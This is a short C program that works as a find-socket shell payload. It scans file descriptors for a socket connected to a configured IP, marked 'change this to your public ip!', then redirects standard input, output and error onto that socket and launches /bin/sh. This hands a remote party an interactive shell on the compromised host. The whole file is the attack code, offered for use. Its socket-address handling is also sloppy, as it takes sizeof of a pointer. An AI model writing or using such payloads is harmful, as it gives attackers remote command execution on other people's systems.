#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>


const long public_ip = 0x7f000001; // 127.0.0.1, change this to your public ip!  

 
int main(int argc, const char *argv[]){
  struct sockaddr_in *s;
  socklen_t s_len = sizeof(s);
  long ip;

  for(int sock_fd=0; sock_fd<65536; sock_fd++){

    // finding sockets
    if(getpeername(sock_fd, (struct sockaddr*) &s, &s_len) != 0)
      continue;

    // checking IP connected to socket, to select the correct socket
    ip = ntohl(*(((int *)&s)+1));
    printf("%x (%x)\n", ip,public_ip);
    if(ip != public_ip)
        continue;

    // redirect fd's into socket
    for (int i=0; i<3; i++)    
     dup2(sock_fd, i); 

    // spawn shell
    char *arg[] = {"/bin/sh",0};
    execve("/bin/sh", arg, NULL);
  }

  puts("Not Found\n");

  return 0;
}
